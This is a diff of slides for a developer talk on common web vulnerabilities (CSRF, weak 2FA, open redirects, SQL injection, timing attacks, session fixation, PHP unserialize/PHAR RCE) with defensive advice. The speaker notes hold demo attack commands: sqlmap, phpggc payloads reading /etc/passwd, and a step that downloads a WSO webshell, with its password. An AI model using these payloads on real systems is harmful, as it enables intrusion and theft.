@@ -71,8 +71,9 @@ class: section-title-a centralimage
 
 ???
 
-- We're not going to look at really old, attacks that won't work on any half-patched system today
-- We're not going to look at the crazy-complicated attacks that you're unlikely to see unless you are facebook
+- The aim of this talk isn't necessarily to show off the newest, crazyiest attacks - there isn't a 'mic drop moment'
+- Instead, we're going to look at the sorts of vulnerabilities that could well be in your system, and the sorts of attacks that an average organisation might see
+    - We're not going to look at the crazy-complicated attacks that you're unlikely to see unless you are facebook
 
 - So, before we look at some actual examples of attacks, I want to help you find vulnerabilities in your own systems, and know what to do when you find one (or have one reported to you)
  - In order to do this, it's often helpful to think like a hacker.
@@ -226,226 +227,724 @@ _ Here you assess the probability of a given exploit being used (consider how ea
    - Something that would be difficult to exploit and would (for example) only result in some emails being sent would likely be 'Very Low', whereas the ability to bypass authentication using a query string that gave full admin access to all your customer a would be Critical!
 
 ---
-class: content-odd
-
-# Coping Mechanisms
-- Refrain from comparison
-- Keep a 'success log'
-- Ask for support
-- Break the cycle
-
-???
-
-- Sometimes, impostor syndrome will just be there - there will be bad days that you just have to survive
-- Some of the things I've done (and still do):
-
-- Try to avoid comparing yourself wth others
- - as we've discovered, your brain will exaggerate their successes (and what is perceives as your failures) to fit it's own narrative
-
-- Keep a 'success log'
- - I still keep a notebook with achievements in that have been recognised by my peers as successful - you can then refer to this when you are having a tough day to remind yourself that you have recognised successes that counter-balance the current struggles
-  
----
-class: content-odd
-
-# Coping Mechanisms
-- Refrain from comparison
-- Keep a 'success log'
-- Ask for support
-- Break the cycle
-
-???
-
-- Ask for support
-  - Remember how we said success was a team sport? Ask someone you know and trust to help you make some wins - remember your brain might try to pass the wins off as completely down to the other person, so keep note of your contributions as evidence that it was a combined win
-- Break the cycle
-  - Trying to do something new (or particularly difficult) on a 'survival' day provides your dumb brain with plenty of ammo to remind yourself that you are a fraud - the fact you can't immediately do 'x', which your brain will tell you everyone else can (even though they probably can't), will trigger the cognative bias into overdrive.
-  - Do something else - partake in a guilty pleasure, if that's singing in the shower, or a glass of wine in the bath go for it!, or pick up other task that you know will be a 'quick win' to remind you of your successes.
-
----
-class: content-even
-
-# Retrain Your Brain
-- Talk
-- Be a mentor
-- Assessments
-- Learning and Development
-
-???
-
-- While we can survive the difficult days, and surviving those days is an achievement in itself, we can do more
-- Our brains love data, and forming patterns in data, so with a little (ok, a lot) of persuading, we can start getting it to think in different ways
-- As with anything involving the brain, practice, practice, practice - repetition is vital
-
-- Talk
- - Find a safe space, a support group that you can share with - with Impostor syndrome we often believe we're the only ones - no-one else seems to be strugling, it's just me
- - The reality is that they probably are (remember that statistic at the start), but, like you, they do their best to hide it
- - Sharing experiences, coping mechanisms, and wins reminds us that, we're all human, we're all imperfect, but that's the best way to be!
-
-
----
-class: content-even
-
-# Retrain Your Brain
-- Talk
-- Be a mentor
-- Assessments
-- Learning and Development
-
-
-???
-
-- Being a mentor might seem insane - if you can't convince yourself you know what you are talking about, how in hell can you convince someone else?
- - But that's kind of the point
- - By taking the time to mentor someone else, and share with them what you _do_ know, you are proving to yourself (and your dumb brain) that actually you know alot more than it gives you credit for
- - And, remember there is a good chance they are thinking/feeling the same as you, that they don't know what they are doing - so by teaching them, and helping them skill up, you are actually giving them ammo to fight their own Impostor syndrome as well
-
----
-class: content-even
-
-# Retrain Your Brain
-- Talk
-- Be a mentor
-- Assessments
-- Learning and Development
-
-???
-
-- Remember we said your brain likes evidence? But it also likes to twist evidence?
- - Look at potential external assessments you can do - maybe that will be a short course with an exam at the end, or an industry-recognised certification
- - If you have data from an un-associated third party (one that, let's be honest, probably doesn't care if you pass or fail!), then your brain can't really twist that to fit it's narrative, and has to start accepting, maybe you do know something after all!
-- Finally, learning and development - we'll come onto this shortly, but essentially, by learning new skils and undertaking personal development, you are proving to your brain that you must have the skills and knowledge required to learn new things
-
----
 
 class: section-title-c center centralimage
 
-# Impostor Syndrome As A Superpower
-.highres[![](impostor/images/success.png)]
+# To Battle!
+.highres[![](hackthesystem/images/battle.png)]
 
 .reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]
 
 ???
 
-- So far, we've looked at how impostor syndrome can negatively impact you, and how to overcome it
-- However, it's not all bad
-- There are actually a number of ways in which Impostor Syndrome can help you become your very own superhero!
+- Let's be honest - when you came to this talk you probably wanted to see some attacks in action right
+- So let's get on with it!
+- We're going to look at 3 'levels'
+ - some really simple potential vulnerabilities - small in scope but very easy
+ - Some that are potentially more damaging, and still fairly easy - these might be your 'high' impact ones
+ - Some that potentially give up full access to everything, but are more unlikely and harder to pull off
+
+---
+
+class: section-title-c center middle
+
+# Level 1
+
+???
+
+---
+
+class: content-even noheader tinycode
+
+```twig
+<table>
+  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
+  <tbody>
+    {% for product in products %}
+        <tr>
+          <td>{{ product.name }}</td>
+          <td>${{ product.price|number_format(2) }}</td>
+          <td>
+            <a href='{{ path("product_edit", {id: product.id}) }}'
+               class='btn btn-success'>Edit</a>
+            <a href='{{ path("product_delete", {id: product.id}) }}'
+               class='btn btn-danger'>Delete</a>
+          </td>
+        </tr>
+    {% endfor %}
+  </tbody>
+</table>
+```
+
+???
+
+- Who has ever seen (or written) code like this before? I'm sure most of us have - I have
+ - Seems fairly innocent, presumably the user has logged in and they're seeing a list of their products that they can edit or delete
+- I'm sure a number of you have seen the problem with this
+
+---
+class: content-even noheader tinycode
+
+```twig
+<table>
+  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
+  <tbody>
+    {% for product in products %}
+        <tr>
+          <td>{{ product.name }}</td>
+          <td>${{ product.price|number_format(2) }}</td>
+          <td>
+            <a href='{{ path("product_edit", {id: product.id}) }}'
+               class='btn btn-success'>Edit</a>
+*            <a href='{{ path("product_delete", {id: product.id}) }}'
+*               class='btn btn-danger'>Delete</a>
+          </td>
+        </tr>
+    {% endfor %}
+  </tbody>
+</table>
+```
+
+???
+
+- The delete is just a regular link - this means that it's going to be triggered by a GET request
+ - Let's say (for example in Tebex's case), we have a fairly large community of users, and many of them know each other or hang out in shared discord, tweet each other etc
+- You could create URLs that you send to others (presumably using a shortner to hide what it's linking to) - and if they click on them, and they're logged in (which they probably are), that's going to immediately go to the delete page
+ - If you've got a confirmation step then great, but if not that product is now gone!
+- This didn't exactly happen to us in the sense it could cause data loss, however you could (in theory) trick someone into changing the template used on their store
+- In short, any action (anything where the user _does_ something) should be a POST request (in other words, a form), and should use CSRF tokens
 
 ---
 
 class: content-odd
 
-# Soft Skills
+# 2FA
 
-- Studies (Tewfik, B, 2021) have shown that individuals who experience impostor syndrome are considered to have better interpersonal skills, be more empathetic and be better facilitators and collaborators
-- This may well be because we use those skills to hide the fact we are frauds (or at least, we think we are)
+- 2FA is great
+ - Every website should support it
+- However, we need to make sure it's secure
+
+???
+
+- In my opinion, 2FA should be mandatory on every site, although I do understand the commercial realities between putting off non-tech-savy users and doing everything perfectly!
+- Who here implements a time-based OTP (Google Auth, Authy)?
+- How big is your 'window'? 2 minutes? 5 minutes?
+
+---
+
+class: content-odd
+# 2FA 
+
+- 5 minute window (in each direction) = 20 valid OTPs
+- Total possible OTPs = 1,000,000 - 1 in 50,000
+- On average you'd need 25,000 guesses to find a valid OTP
+- 2,500 requests a minute - not that many!
+
+???
+
+- This is slightly simplified, as during that 10 minutes obviously some of those codes would no longer be valid and some that potentially were already tested would become valid
+ - However, the principle is that an insecurely implemented 2FA gives a false sense of security
+
+---
+class: content-odd
+
+# 2FA
+
+- Use rate-limiting
+ - However, rate-limiting on IP (as is provided by services such as CloudFlare) isn't enough
+ - Attacker could use a large number of IPs, and share the session cookie between the instances to try lots of OTPs and bypass limites
+- Rate-limiting needs to be against the account in question
 
 ---
 
 class: content-even
 
-# Continually Improving Skills
+# What Do You Suggest?
 
-.smallish[- Someone with impostor syndrome may spend more time trying to develop the skills they think they are missing
-- Studies show that experiencing impostor syndrome drives diligence, hard work and desire to reach higher standards (Flett et al.,
-1992) and (Stober & Childs, 2010).
-- To someone with impostor syndrome, any amount of improvement probably never seems good enough, but we can harness this to maximse our development]
-
-???
-
-- When you think about it, it makes sense that someone who believes they are faking it and doesn't have the skills they need will spend contact hours trying to develop and build those skills
- - Studies find they still won't display those skills in public, but they're continually spending time trying practising their craft
-- This can be dangerous, as impostor syndrome and perfectionism often go hand in hand, and holding yourself to an impossibly high standard is again giving your brain evidence that fits what it believes
- - and that is where our success log and external assessment comes in
-- But what if we can harness that desire, maximise our ability to learn, and prove to our dumb brain that we are better than that, all at the same time?
+- If someone sees a login that they don't recognise, what do we usually suggest?
 
 ---
+class: content-even
 
-class: content-odd halfhalf
+# What Do You Suggest?
 
-# Power Up Your Learning
-
-.withtitle[.smallish[- The often make is going 'too fast', trying to jump up the ladder as quickly as possible
-- However, we actually gain the most from being in the 'sweet spot']]
-
-.right[![](impostor/images/target.png)]
+- If someone sees a login that they don't recognise, what do we usually suggest?
+- Password resetting
+ - But is that enough?
+ - What do you do with any existing sessions?
 
 ???
 
-- If you feel you are missing skills, the danger is to try and learn everything all at once. However, it's important to learn in your 'sweet spot'
-  
-- Imagine that target represents your ability - right now you are in the red zone:
-- Too easy (the middle), and no learning takes place
-- At your current skill level re-enforces what you know, but doesn't help you improve
-- Slightly harder (the ourter circle), builds upon what you already know, but in an achivable way
-- Significantly harder (off the target) - you might struggle through it with help (depending on _how_ much harder it is), but you are not going to be able to learn from it
+- I've seen plenty of applications where changing your password either:
+ - Doesn't log anyone out
+ - Only logs you out - doesn't expire any other sessions
+- If an attacker is already in your account, then changing your password (or 2FA for that matter) doesn't make a difference
+- Whenever any authentication details change (email address, password or 2FA) - _all_ sessions should be expired
 
 ---
+class: content-odd middle center
 
-class: content-odd halfhalf
-
-# Power Up Your Learning
-
-.withtitle[.smallish[- The often make is going 'too fast', trying to jump up the ladder as quickly as possible
-- However, we actually gain the most from being in the 'sweet spot']]
-
-.right[![](impostor/images/target.png)]
+## http<i></i>s://site.com/login/?return=
+## https%3A%2F%site.com%2Fproducts
 
 ???
+- Who has see a link like this before?
+ - Fairly common - control where we will be sent back to after logging in (or performing some other action)
+- This can be used to gain trust (and then potentially tricker users into sharing details etc)
 
-- An example of this is learning to read - a child who knows the letters of the alphabet won't gain too much (other than confidence) by repeating the letters of the alphabet over and over.
-- They are likewise not going to be able to go from knowing the individual letters to reading war and peace, no matter how much help they get.
-- However, with a little bit of guidance and help from a teacher or an older student, could read words like 'dog' or 'cat'.
-
-- This is called Vygotsky scaffolding (Vi - got - ski), where you can build upon your existing knowledge (and prove your existing knowledge to yourself at the same time) with a little assistance (be that a mentor, or a resource online for example) in incremental steps, like building scaffolding a layer at a time
-
-- Remember, record all the learning you do in your achievement log, so that can can build up this 'portfolio of proof' to show your brain when it's trying to screw you over.
 ---
-class: halfhalf reverse content-even
+class: content-odd middle center
 
-# Teach Others
-
-.withtitle[.smallish[- Teaching something you've learned to others helps you to fully understand it
-- Explaining concepts to another person is a different way of learning - the more methods you use, the more effective it will be]]
-
-.left[![](impostor/images/teaching.png)]
+## http<i></i>s://site.com/login/?return=
+## **https%3A%2F%badsite.com%2Frelogin**
 
 ???
-
-- We've already discussed how mentoring and sharing knowledge is a method of retaining your brain
-- By using this method to share something you've just learned, you get two effects for the price of one:
- - Explaining new concepts is a common method of consolidating and internalizing learning, as well as proving to yourself that you have learned this new topic at the same time!
-
+- The user has logged in on the correct site (and, as we advise, checked the URL etc)
+- Who re-checks the URL _after_ they're redirected?
+ - That badsite.com could ask them to re-login, or confirm their 2FA or any other number of actions that could then be used to compromise their data
+ - If it looks like the original site, the user will probably never suspect a thing!
 
 ---
 
 class: content-odd
 
-# Observations
-
-- Please don't tell someone they have impostor syndrome
- - While well-intentioned, it often makes things worse
-- There are other reasons individuals can feel like frauds
- - External discrimination or outdated views repeated often enough can be internalised
-- There is an opposite of Impostor Syndrome - the Dunning-Kruger Effect!
+# Open Redirect
+- This is called an open redirect - the redirect can be changed to send the user wherever the attacker wants
+ - Restrict redirect to just this domain
+ - Created signed redirerct URLs that cannot be changed/spoofed
+ - Only allow redirects to a pre-defined list of allowable URLs
 
 ???
 
-- Something that can be very dangerous is telling someone they have impostor syndrome.
-- Imagine a situation where someone is trying to do something really hard - way above their current level. They ask for help, saying they don't understand it and can't do it, but the response they get is "Oh, that's just impostor syndrome, you'll be fine".
- - Actually, in that situation they need help!! If someone trusts you enough to share their struggles with you, then help them cope, then help them retrain their brain, but please don't make an assumption first
-- While way outside the scope of this talk, not all feelings of inadequacy or feelings of being a fraud are impostor syndrome - many minorities have been the subject of outdated views, for example, that when repeated often enough, can feel true to the individual involved
-- In case anyone is wondering, there is an opposite of Impostor Syndrome - unfortunately we don't have time to talk about it right now, but let's just say the study that gave it it's name, the Dunning-Kruger effect came from a news report of a bank robber who covered his face in lemon juice, thinking it would hide his face in the same way it can be used as inivisble ink!!
+- Open redirects are not a security vulnerability in themselves - they do not leak data or cause problems
+ - However they can give the user trust of confidence that can then be exploited
+- Various solutions exists
+ - Restricting redirects to just the domain in question is one option - however if you have GET-based actions as we described before, that's still a potential risk
+ - Create signed URLs, so the redirect URL comes with a signature that is verified before the redirect happens - this still allows for external redirects when required, but provides confidence that the links are approved 
+  - This is something that Tebex does, as we have to perform external redirects
+  - Similar to this, actually store all the redirect URLs in a database, and only provide a linkId or similar, and fetch the redirect out of the DB - could be DB heavy if you generate alot of redirect links
+ - If there are only a limited number of places a user should be redirected to, maintain a list of these, and only accept redirects to one of these URLs - again potentially idenfitied by an ID
+
+---
+
+class: section-title-c center middle
+
+# Level 2
+
+???
+
+- So we've been through some basic vulnerabilities - in scope they're all fairly small,
+  - but perhaps one or two of you are thinking to your own codebases and realising that some of them exist
+- The good news is that they're all simple to fix!
+- Now we're going to look at a few vulerabilities that could have wider impacts
+
+---
+class: content-odd center
+
+# SQL Injection
+
+
+???
+
+- No security talk would be complete without a mention of SQL injection.
+ - However, the common argument I hear is:
+
+---
+class: content-odd center
+
+# SQL Injection
+
+![](hackthesystem/images/angry.png)
+
+.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]
+
+???
+
+- "Everyone uses an ORM these days - SQL injection isn't really a thing any more" - and most of the time you'd be right
+ - However, I'll be the first to admit that sometimes I can be lazy - and the complicated, abstracted codebases we work on can hide potential gotchas
+
+---
+class: content-odd
+
+```php
+class emailStats {
+  public function complicatedAnalyticsCall(string $email) {
+      return DB::select(
+        "SELECT COUNT(1) FROM payments p " .
+        "FORCE INDEX (payments_email_status_idx) " .
+        "INNER JOIN accounts a ON p.account_id = a.id " .
+        "WHERE some complicated, expensive statement " .
+        "AND p.email = '$email'"
+      );
+  }
+}
+```
+
+???
+
+- Have you ever written a query by hand, because the SQL generated by your ORM was dog slow? I have
+- In this instance we _should_ use prepared statements, but I'd guess that it's not always done
+- In this instance, perhaps you _know_ that the email address is coming from the database, so you trust the data
+ - But someone else might not realise that - what if this function is re-used by another developer down the line,
+   but now they're passing in an email address provided by a user?
+
+---
+
+class: content-odd
+
+# sqlmap
+
+- Manually finding and exploting a vulnerability would be very difficult
+- sqlmap automates the process - simply provide a URL that _could_ have vulnerable params, and it'll do everything else 
+
+???
+
+- Even if we do have a vulnerable param in our code, it's easy to think it would be difficult (if not impossible) to exploit
+ - But there are tools that will do the work for us
+- sqlmap is a common tool used for finding and exploiting vulnerable params for mysql injection
+
+---
+
+class: content-odd center middle
+
+# DEMO
+
+???
+
+- Show example code
+- http://localhost:9999/mysql?title=pride&year=1810
+- cd /home/liam/Projects/talks/hackthesystem/tools/sqlmap-dev
+- ./sqlmap.py  --purge
+- ./sqlmap.py -u "http://localhost:9999/mysql?title=pride&year=1810" --sql-shell
+- SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES
+
+---
+class: content-odd
+
+# SQL Injection
+
+- **Always** use prepared statements
+- Assume that _all_ data could be coming from a user   
+- Remember, tools exist to maximise the potential of the smallest possible vulnerability
+
+???
+
+- No security talk would be complete without a mention of SQL injection.
+- However, the common argument I hear is:
+
+---
+class: content-even
+
+# Timing Attacks
+
+- The initial aim of many hacks is to enumerate something
+ - Like email addresses, to know which email addresses have accounts that could potentially be exploited
+- One way of doing this if you don't have DB access is using timing attacks.
+
+???
+
+- There are many different types of timing attacks - comparison attacks (where the more of a string that matches, the longer it takes), index attacks (where the more of an index is consumed, the longer it takes)
+   - These are covered in many different resources, and comparison functions such as hash_equals and password_verify are timing safe
+- So instead, let's think about how we write code - we will often have different logic branches that do different things, for example:
+
+---
+class: content-even noheader
+
+```php
+$user = User::where('email', $email)->first();
+
+if (!$user) {
+    return redirect()->back()->withError(
+        ['email' => 'Invalid login']
+    );
+}
+
+if (!password_verify($password, $user->password)) {
+    return redirect()->back()->withError(
+        ['email' => 'Invalid login']
+    );
+}
+```
+
+???
+
+- In this code, we've actually thought about security...
+
+---
+class: content-even noheader
+
+```php
+$user = User::where('email', $email)->first();
+
+if (!$user) {
+    return redirect()->back()->withError(
+*        ['email' => 'Invalid login']
+    );
+}
+
+if (!password_verify($password, $user->password)) {
+    return redirect()->back()->withError(
+*        ['email' => 'Invalid login']
+    );
+}
+```
+
+???
+
+- We return the same error for either no user found or no password, so an attacker can't see if the email exists or not based on the message
+- But is there another way of getting that information?
+- In this code, password_verify takes an additional nonzero amount of time to run - so any time there is a matching email address, regardless of if the password is right or not, it will take longer
+    - In order to do this accurately you need to run it a large number of times, to average out network latency etc, but it's entirely possible to do
+
+---
+class: content-even noheader tinycode nudgeup
+
+```php
+$users = [
+    'liam@tebex.co.uk' => password_hash('testtest123', PASSWORD_DEFAULT),
+    'liam@w.iltshi.re' => password_hash('testtest123', PASSWORD_DEFAULT),
+];
+$tests = ['nouser@test.com', 'liam@tebex.co.uk', 'anothernonuser@example.com']; $times = [];
+
+foreach ($tests as $test) {
+    $times[$test] = 0; $x = 1;
+    while ($x <= 10) {
+        $start = microtime(true);
+        usleep(rand(10000,99999));
+        $user = $users[$test] ?? false;
+        if ($user) { password_verify('aksjdhkasjdh81', $user); }
+        $times[$test] += (microtime(true) - $start);
+        $x++;
+    }
+    $times[$test] /= 10;
+}
+var_dump($times);
+```
+
+???
+
+- Apologies for the formatting - trying to get it on one slide!
+- Explain what the code does
+ - Not a completely representative test as we're pulling the records from an array
+ - But we are adding a usleep to simulate network etc - between 10 and 100 ms - the point being that the 'jitter' will average out!
+
+---
+
+class: content-even
+
+```php
+array(3) {
+  'nouser@test.com' => double(0.040307402610779)
+  
+  'liam@tebex.co.uk' => double(0.10314846038818)
+  
+  'anothernonuser@example.com' => double(0.067523074150085)
+}
+```
+
+???
+
+- You can see that the valid user took a clearly detectable amount of additional time
+ - In the real world, in order to average around network lag, DB query variation etc you'd need to run the query significantly more than 10 times, but the the power of some botnets etc these days, that's entirely possible!
+
+---
+class: content-even
+
+# Timing Attacks
+- Rate Limit
+  <br /><br />
+- Fixed execution time functions
+ 
+???
+
+- As we've touched upon before, many large botnets have thousands of IPs - so they can work around the rate limit, however the likelyhood is those different connections will be in different locations, have different latency, making averaging out the variability much harder
+- Forcing a function to run for a specific amount of time is a double-edged sword - on the one hand it can work, however, if you set it too short then it won't make all calls last the same amount of time, and if you set it too long you are making users wait unnecessarily.
+ - But, as an additional measure that makes such attacks harder (and thus not worth it, meaning the attacker will move onto an easier target), it can work
+
+---
+
+class: content-odd nudgeup tinycode
+
+# Session Fixation
+
+- Session fixation is when an attacker tricks a victim into using a session they've already created
+- In the bad old days, `?PHPSESSID=xxxx` was a pretty easy way to get a victim to use your session
+- However it's still possible now:
+
+```php
+http://yoursite.com/page.php
+ ↳ ?q=<script>document.cookie=
+ ↳ "PHPSESSID=qvidf3pweno6c12whk3hk26oxs0hjke0";</script>
+```
+
+???
+- Victim logs in with the session, attacker can then use the session to access the victim's account
+- Again, the potential weakness is invalidated user input - imagine you have a page that displays a user-provided value
+ - Perhaps originally it wasn't user provided, or perhaps you figured (as I have done before) - the user is only going to damage their own account, it's no big deal
+- If this link is provided to someone and they don't check it (let's be honest, alot of users wouldn't understand what that ?q= does anyway), that javascript could be output to the page, setting the session in a cookie
+
+---
+class: content-odd
+
+# Session Fixation
+- **Never** trust user input!
+- Regenerate sessions on any session-changing action, especially login
+ - Setting a new session ID for the now logged in user means the old session ID (that the attacker has, is still not logged in)
+
+---
+
+class: section-title-a center middle
+
+# Level 3
+
+???
+
+- Now we're going to look at an attack (and some variations to consider) that could in theory allow an attacker to gain full access to your system
+ - They are definitely more difficult to pull off, and with some basic validation are prevented, but this is the sort of thing that is possible if you don't account for every piece of data
+
+---
+
+class: content-even center centralimage
+
+# Remote Code Execution (RCE)
+
+.highres[![](hackthesystem/images/rce.png)]
+
+.reference[Technology vector created by macrovector (freepik.com/vectors/technology)]
+
+???
+
+- RCEs are the nightmare we hope we don't have to face - where an attacker can get our application (or server) to run code they want it to
+ - Once the attacker can run one piece of code, it's likely they can use that to give themselves greater access to allow them to run further commands, download sensitve data, potentially even make changes to the application
+
+---
+class: content-even
+
+# Remote Code Execution (RCE)
+
+- RCEs can happen in a variety of ways, such as:
+ - Supply Chain Attacks
+ - Software design flaws (OS, stack software)
+ - Dynamic code execution/injection
+
+???
+
+- There are lots of ways that an RCE can happen
+ - it could be by using an infected third party library - a "supply chain attack"
+  - (such as incidents over the past few years with the event-stream npm package and various wordpress plugins that have been purchased by bad actors to inject spam into hundreds of thousands of sites)
+ - There have been numerious potential RCE vectors in software including openssl, apache, nginx and PHP
+- For the first two, keeping your libraries and other software you use up to date is your main defense, as well as monitoring security advisories
+ - For PHP specifically, Roave have a composer package that deals with alot of this, and if you are using private packagist they will send you advisories on packages you have installed
+ - other languages and package managers have other ways of doing it, such as `npm audit`
+- So we're going to look one way of performing dynamic code execution
+
+---
+class: content-even
+
+# serialize() / unserialize()
+
+- `serialize()` returns a string containing a byte-stream representation of any value that can be stored in PHP.
+- `unserialize()` can use this string to recreate the original variable values.
+ - This includes objects
+
+???
+
+- In PHP, serialize and unserialize are super useful functions that allow us to convert variables into strings, then re-hydrate them back into variables
+- This includes the ability to convert objects into strings and back again
+ - The object itself isn't turned into a string (so the string doesn't contain references to the objects methods etc), but when `unserialize` is called, effectively it creates an instance of that object, and pushes the properties to it
+- Used in all sorts of frameworks and libraries, such as Laravel for jobs
+
+---
+
+class: content-even tinycode
+
+# unserialize()
+
+```php
+class SaasCompiler
+{
+    private $cacheFile;
+    private $compiledSass = '';
+    
+    public function getSass(): string
+    {
+        return $this->compiledSass;
+    }
+    
+    public function __wakeup()
+    {
+        $this->compiledSass = file_get_contents($this->cacheFile);
+    }
+}
+```
+
+???
+
+- When an object is unserialized, PHP will check for the existance of a `__wakeup()` or `__unserialize()` function, and will run them
+ - In poorly designed code, this can lead to remote code being executed
+ - So, if we can trick the application into unserializing a 'bad' object:
+   - we could set `cacheFile` to something malicious - say the config file or passwd file 
+   - Then on wakeup it would grab that file and assign it to compiledSass, which is presumably going to be output somewhere
+ - Obviously this could be bad!
+- It can also impact other automatically executed calls as well - such as `__destruct()`, `__toString()` etc
+
+---
+class: content-even
+
+# How Bad Can It Be?
+
+- Guessing at every possible serialized object that _might_ have a vulnerable `__destruct()` or `__wakeup()` isn't practical
+- But what about commonly used code? PHP libraries that are installed on thousands of codebases?
+ - Trying to create these exploits manually would be a huge amount of work
+ - Thankfully (for them), they don't need to!
+
+---
+class: content-odd
+
+# PHPGGC
+
+- PHP Generic Gadget Chains is a library of payloads that exploit known vulnerable `unserialize()` calls
+- Covers well known frameworks and libraries such as Laravel, Guzzle, Wordpress, Monolog and more
+- Will also generate payloads for you to use in an attack
+
+---
+
+class: section-title-b center middle
+
+# DEMO
+
+???
+
+- Show example code
+- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
+- ./phpggc Guzzle/RCE1 system "cat /etc/passwd > ../../../public/passwd" > payload
+- mv payload ../../laravel/app/Http/Controllers/
+- http://localhost:9999/rce/payload
+- http://localhost:9999/passwd
+
+---
+
+class: content-odd center
+
+.highres[![](hackthesystem/images/bank.png)]
+
+???
+
+- And the hacker is taking your vulnerability all the way to the bank!
+- Now, the key is, are you really going to accept a random file upload without checking it, grab it's contents and just so happen to run unserialize on it?
+ - Of course you are not!
+
+---
+
+class: content-odd center
+
+.highres[![](hackthesystem/images/idea.png)]
+
+???
+
+- But they're ahead of you!
+
+---
+
+class: content-even
+
+# Polyglot JPEG/PHAR files
+.small[
+- Within PHP, there is a `phar://` stream - this will tell PHP to treat the file as a PHP archive.
+  - When the phar file is loaded, the metadata within the phar manifest is `unserialize`d
+- At the same time, you can hide a phar file within a jpeg
+- The phar load / unserialize step can happen on more or less any file-based function - including some you might innocently use to validate the file itself!
+ - `file`, `file_exists`, `filesize`, `is_dir` and more
+]
+???
+
+- For mostly time reasons (and the fact it gets very complicated and makes my head explode!), we can't go into the minute detail of how this works
+- However, remember our exploit above relies on injecting data into a serialized object that is going to be deserialized.....
+- If we hide the phar in a jpeg, then that will get past one of the initial upload checks that usually happens
+- If only there was a tool that could this for us.....
+
+
+---
+
+class: section-title-c center middle
+
+# DEMO
+
+???
+
+- Show example code
+- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
+- ./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg
+- mv loaded-mono.jpg ../../laravel/app/Http/Controllers/
+- http://localhost:9999/image?filename=phar://loaded-mono.jpg
+- http://localhost:9999/wso.php
+- PW ghost287
+
+---
+
+class: content-even
+
+# Polyglot JPEG/PHAR files
+
+- This still requires trusting user input, in that the system needs to be tricked into using the `phar://` wrapper
+- So, yet again **never trust user input!**
+- Bear in mind this might not be on a user request - if you have scheduled tasks this could be an attack vector as well
+ - **Never** run scheduled tasks as root!
+
+???
+
+- Imagine you have an app that uploads an image and saves the filename, then later on that image is processed by a scheduled task
+   - You might assume the data in the database is fine, but do you know it is validated at creation?
+- Even worse if your scheduled tasks run as root - I've seen (and done!) plenty of cron tasks as root before I understood how bad it could be - you've just given the hacker full root access!
+
+---
+
+class: content-odd
+
+# Tools
+
+- sqlmap: https://sqlmap.org/
+- PHPGGC: https://github.com/ambionics/phpggc
+- Metasploit: https://www.metasploit.com/
+- BurpSuite: https://portswigger.net/burp
+
+???
+
+- We've used sqlmap and PHPGGC in this talk
+- Also just want to signpost metasploit, which is a pen testing tool that can be used to automate thousands of potential attack vectors
+ - And burpsuite which is another pen testing tool, and includes a proxy tool that allows you to intercept, modify and resend HTTP requests on the fly to try different attack vectors
+
+---
+class: summary-slide
+
+- Hacking and security will always be part of development
+- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
+- Human error is always part of the attack vector
+ - Think like an attacker when reading or reviewing code
+ - Assume your users will make mistakes, and ensure you are protecting them
+
+???
+- Hacking and security will always be part of development
+   - it's a cat-and-mouse game - we'll keep making applications more secure, and the attackers will keep devising new ways to get in
+- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
+   - The reality is that no system is 100% secure - but hacking is a business and if the reward isn't worth the time and effort required, then an attacker will look for one that is 
+- Human error is always part of the attack vector
+   - Human error could be us as developers, it could be our supply chain, or it could be users - try to think about all the potential ways the human error could leave a way in, and what you can do to mitigate it
+- Think like an attacker when reading or reviewing code
+   - Remember, an attacker isn't going to manually try to exploit that vulnerable parameter - they'll use tools to make their life easier, so use the tools first before a hacker can get to it
+- Assume your users will make mistakes, and ensure you are protecting them
+   - There are ways that we can defend against mistakes our users might make - user's can be expected to understand what every URL does, and we have to assume they will click that link that their 'friend' sent them, so let's ensure the opportunity for something bad to happen isn't there
+- To finish, I want to leave you with this quote:
 
 ---
 class: summary-slide middle
 
-Impostor syndrome is way more common than we realise - we see our peers as successful and high-achieving, when inside they might feel just the same as we do. Support each other on the bad days, and share in successes on the good.
+> _“The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards — and even then I have my doubts.”_
 
-Impostor syndrome is usually seen as bad - but using it as your superpower lets you prove to yourself that you are way more skilled than you give yourself credit for.
+.right[Gene Spafford]
+
 
 ---
-
 
 
 class: thanks-slide
